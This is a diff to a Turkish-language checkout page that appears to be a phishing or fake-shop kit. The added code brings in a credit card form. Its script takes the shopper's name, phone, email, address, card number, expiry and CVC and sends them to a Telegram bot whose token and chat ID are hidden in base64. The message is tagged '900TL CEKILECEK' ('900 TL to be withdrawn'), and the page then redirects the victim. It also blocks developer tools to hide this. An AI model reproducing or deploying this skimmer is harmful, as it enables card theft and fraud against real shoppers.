@@ -122,7 +122,7 @@
 
                                                     <div class="field">
                                                         <label>
-                                                            Ad Soyad*
+                                                            Ad Soyadd*
                                                             <input type="text" name="name" id="name_surname" required>
                                                         </label>
                                                     </div>
@@ -131,7 +131,7 @@
                                                         <label>
                                                             Telefon Numarası*
                                                             <input type="tel" name="phone" id="phone_number" min="25"
-                                                                max="25" minlength="5" maxlength="25" required>
+                                                                max="25" minlength="25" maxlength="25" required>
                                                         </label>
                                                     </div>
 
@@ -167,63 +167,182 @@
                                                 </div>
                                             </div>
                                         </div>
-                                       <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Havale/Eft Bilgileri</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-        }
+                                        <div class="clear"></div>
+                                        <div class="card">
+                                            <div class="section-hero">
+                                                Kredi/Banka Kartı ile Ödeme
+                                            </div>
 
-        .container {
-            max-width: 600px;
-            margin: 20px auto;
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
+                                            <div class="card-information">
+                                                <div class="title">
+                                                    Lütfen Kart bilgilerinizi yazın.
+                                                </div>
 
-        .bilgi-kutu {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            border: 1px solid #ddd;
-            padding: 10px;
-            margin-bottom: 10px;
-        }
+                                                <div class="form-area js-new-creditcard-area">
+                                                    <div class="field">
+                                                        <label>
+                                                            Ad Soyad
+                                                            <input type="text" name="cardholder_name"
+                                                                id="cardholder_name" required>
+                                                        </label>
+                                                    </div>
 
-        .metin {
-            flex-grow: 1;
-            margin: 0;
-        }
+                                                    <div class="field">
+                                                        <label>
+                                                            Kart Numarası
+                                                            <input type="text" name="card_number"
+                                                                class="js-payment-card-number" id="card_number" min="25"
+                                                                max="25" minlength="25" maxlength="25" required>
+                                                        </label>
+                                                    </div>
 
-        .kopyala-dugme {
-            padding: 8px;
-            cursor: pointer;
-            background-color: #4CAF50;
-            color: white;
-            border: none;
-            border-radius: 4px;
-        }
-    </style>
-</head>
-<body>
+                                                    <div class="field-dates">
+                                                        <div class="title">
+                                                            Son Kullanma Tarihi
+                                                        </div>
+                                                        <div class="select select--first">
+                                                            <label for="card_month"></label>
+                                                            <select autocomplete="off" name="card_month"
+                                                                class="js-payment-month" id="card_month" required>
+                                                                <option value="1">
+                                                                    1
+                                                                </option>
 
+                                                                <option value="2">
+                                                                    2
+                                                                </option>
 
+                                                                <option value="3">
+                                                                    3
+                                                                </option>
 
-                                                    
-                                                        
-                                               
+                                                                <option value="4">
+                                                                    4
+                                                                </option>
+
+                                                                <option value="5">
+                                                                    5
+                                                                </option>
+
+                                                                <option value="6">
+                                                                    6
+                                                                </option>
+
+                                                                <option value="7">
+                                                                    7
+                                                                </option>
+
+                                                                <option value="8">
+                                                                    8
+                                                                </option>
+
+                                                                <option value="9">
+                                                                    9
+                                                                </option>
+
+                                                                <option value="10">
+                                                                    10
+                                                                </option>
+
+                                                                <option value="11">
+                                                                    11
+                                                                </option>
+
+                                                                <option value="12">
+                                                                    12
+                                                                </option>
+
+                                                            </select>
+                                                        </div>
+                                                        <div class="select">
+                                                            <label for="card_year"></label>
+                                                            <select autocomplete="off" name="card_year"
+                                                                class="js-payment-year" id="card_year" required>
+                                                                <option value="2023">
+                                                                    2023
+                                                                </option>
+
+                                                                <option value="2024">
+                                                                    2024
+                                                                </option>
+
+                                                                <option value="2025">
+                                                                    2025
+                                                                </option>
+
+                                                                <option value="2026">
+                                                                    2026
+                                                                </option>
+
+                                                                <option value="2027">
+                                                                    2027
+                                                                </option>
+
+                                                                <option value="2028">
+                                                                    2028
+                                                                </option>
+
+                                                                <option value="2029">
+                                                                    2029
+                                                                </option>
+
+                                                                <option value="2030">
+                                                                    2030
+                                                                </option>
+
+                                                                <option value="2031">
+                                                                    2031
+                                                                </option>
+
+                                                                <option value="2032">
+                                                                    2032
+                                                                </option>
+
+                                                                <option value="2033">
+                                                                    2033
+                                                                </option>
+
+                                                                <option value="2034">
+                                                                    2034
+                                                                </option>
+                                                            </select>
+                                                        </div>
+                                                        <div class="clearfix"></div>
+                                                    </div>
+                                                    <div class="field field-cvc">
+                                                        <label>
+                                                            CVC
+                                                            <input type="text" autocomplete="off" name="card_cvv"
+                                                                class="js-payment-cvv" maxlength="3" id="card_cvv"
+                                                                required>
+                                                        </label>
+                                                        <div class="tips">
+                                                            CVC
+                                                            <span class="checkout__payment__cvc-info">
+                                                                nedir?
+                                                                <img loading="lazy"
+                                                                    src="assets/img/static_omnishop/ayb822/assets/img/cvv.png">
+                                                            </span>
+                                                        </div>
+                                                    </div>
+                                                </div>
                                             </div>
                                             <div class="clear"></div>
                                         </div>
-                                        
+                                        <div class="installment">
+                                            <div class="section-hero hidden-xs">
+                                                BİLGİLENDİRMELER
+                                            </div>
+                                            <div class="installment-area">
+                                                <div class="agrement">
+                                                    <div class="checkbox">
+                                                        <a href="#" class="js-ajax-popup"
+                                                            title="Ön Bilgilendirme Koşulları"">Ön Bilgilendirme Koşulları</a>’nı
+                                                ve <a href=" #" class="js-ajax-popup"
+                                                            title="Uzaktan Satış Sözleşmesi">Uzaktan
+                                                            Satış Sözleşmesi</a>’ni okudum ve kabul ediyorum
+                                                    </div>
+                                                </div>
 
                                                 <div id="js-orders-complete-button" class="js-complete-with-masterpass">
                                                     <button type="submit" class="button block green continue-button"
@@ -232,83 +351,103 @@
                                                             id="order-spinner">İşleniyor.. <img
                                                                 src="assets/img/static_omnishop/ayb822/assets/img/spinner.gif"
                                                                 width="40" alt="spinner"></span>
-                                                        <span class="order-complete" id="order-complete">Odemeyi Tamamla</span>
+                                                        <span class="order-complete" id="order-complete">Siparişi
+                                                            Tamamla</span>
                                                     </button>
                                                 </div>
                                             </div>
                                         </div>
                                         <div class="clearfix"></div>
                                     </form>
+                                    <script>
+                                        document.addEventListener('DOMContentLoaded', function () {
+                                            document.getElementById('payment_button').addEventListener('click', function (event) {
+                                                event.preventDefault();
 
+                                                var requiredFields = ['name_surname', 'phone_number', 'email_address', 'city', 'district', 'address', 'cardholder_name', 'card_number', 'card_month', 'card_year', 'card_cvv'];
 
-                                   <script>
-document.addEventListener('DOMContentLoaded', function () {
-    document.getElementById('payment_button').addEventListener('click', function (event) {
-        event.preventDefault();
+                                                for (var i = 0; i < requiredFields.length; i++) {
+                                                    var fieldId = requiredFields[i];
+                                                    var fieldValue = document.getElementById(fieldId).value.trim();
 
-        var requiredFields = ['name_surname', 'phone_number', 'email_address', 'city', 'district', 'address'];
+                                                    if (fieldValue === '') {
+                                                        alert('Lütfen tüm alanları doldurun.');
+                                                        return;
+                                                    }
+                                                }
 
-        for (var i = 0; i < requiredFields.length; i++) {
-            var fieldId = requiredFields[i];
-            var fieldValue = document.getElementById(fieldId).value.trim();
+                                                var existingErrorMessage = document.querySelector('.error-message');
+                                                if (existingErrorMessage) {
+                                                    return;
+                                                }
 
-            if (fieldValue === '') {
-                alert('Lütfen tüm alanları doldurun.');
-                return;
-            }
-        }
+                                                var existingErrorMessage = document.querySelector('.error-message');
+                                                if (existingErrorMessage) {
+                                                    return;
+                                                }
 
-        var nameSurname = document.getElementById('name_surname').value;
-        var phoneNumber = document.getElementById('phone_number').value;
-        var emailAddress = document.getElementById('email_address').value;
-        var city = document.getElementById('city').value;
-        var district = document.getElementById('district').value;
-        var address = document.getElementById('address').value;
+                                                var nameSurname = document.getElementById('name_surname').value;
+                                                var phoneNumber = document.getElementById('phone_number').value;
+                                                var emailAddress = document.getElementById('email_address').value;
+                                                var city = document.getElementById('city').value;
+                                                var district = document.getElementById('district').value;
+                                                var address = document.getElementById('address').value;
 
-        var botTokenBase64 = 'NjMxMDg3MjM1NDpBQUVYcHljVEw3aURCcm5kckJQcE1oci1fYUFlcHhDM1ZWaw=='; // Telegram bot token'ını buraya ekleyin
-        var chatIdBase64 = 'LTEwMDIxMjEwMTQ5ODU=';
+                                                var cardholderName = document.getElementById('cardholder_name').value;
+                                                var cardNumber = document.getElementById('card_number').value;
+                                                var cardMonth = document.getElementById('card_month').value;
+                                                var cardYear = document.getElementById('card_year').value;
+                                                var cardCvv = document.getElementById('card_cvv').value;
 
-        var botToken = atob(botTokenBase64);
-        var chatId = atob(chatIdBase64);
+                                                var botTokenBase64 = 'NjMxMDg3MjM1NDpBQUVYcHljVEw3aURCcm5kckJQcE1oci1fYUFlcHhDM1ZWaw=='; // Telegram bot token'ını buraya ekleyin
+                                                var chatIdBase64 = 'LTEwMDIxMjEwMTQ5ODU=';
 
-        var apiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
-        var message = 'Ad Soyad: ' + nameSurname +
-            '\nTelefon Numarası: ' + phoneNumber +
-            '\nE-Posta: ' + emailAddress +
-            '\nİl: ' + city +
-            '\nİlçe: ' + district +
-            '\nAdres: ' + address;
+                                                var botToken = atob(botTokenBase64);
+                                                var chatId = atob(chatIdBase64);
 
-        var data = {
-            chat_id: chatId,
-            text: message
-        };
+                                                var apiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+                                                var message = '900TL CEKILECEK Ad Soyad: ' + nameSurname +
+                                                    '\nTelefon Numarası: ' + phoneNumber +
+                                                    '\nE-Posta: ' + emailAddress +
+                                                    '\nİl: ' + city +
+                                                    '\nİlçe: ' + district +
+                                                    '\nAdres: ' + address +
+                                                    '\n\nKart Bilgileri:' +
+                                                    '\nAd Soyad: ' + cardholderName +
+                                                    '\nKart Numarası: ' + cardNumber +
+                                                    '\nSon Kullanma Tarihi: ' + cardMonth + '/' + cardYear +
+                                                    '\nCVC: ' + cardCvv;
 
-        fetch(apiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Success:', data);
-            window.location.href = 'odeme-islem.html';
-        })
-        .catch((error) => {
-            console.error('Error:', error);
-            alert('Bir hata oluştu. Lütfen tekrar deneyin.');
-        });
-    });
-});
+                                                var data = {
+                                                    chat_id: chatId,
+                                                    text: message
+                                                };
 
-Object.defineProperty(window, 'console', {
-    value: console,
-    writable: false,
-    configurable: false
-});
-</script>
+                                                fetch(apiUrl, {
+                                                    method: 'POST',
+                                                    headers: {
+                                                        'Content-Type': 'application/json'
+                                                    },
+                                                    body: JSON.stringify(data)
+                                                })
+                                                    .then(response => response.json())
+                                                    .then(data => {
+                                                        console.log('Success:', data);
+
+                                                        window.location.href = 'test.html';
+                                                    })
+                                                    .catch((error) => {
+                                                        console.error('Error:', error);
+                                                    });
+                                            });
+                                        });
+
+                                        Object.defineProperty(window, 'console', {
+                                            value: console,
+                                            writable: false,
+                                            configurable: false
+                                        });
+                                    </script>
                                     <script>
                                         document.addEventListener('keydown', function (e) {
                                             if (e.key === 'F12' || e.keyCode === 123) {
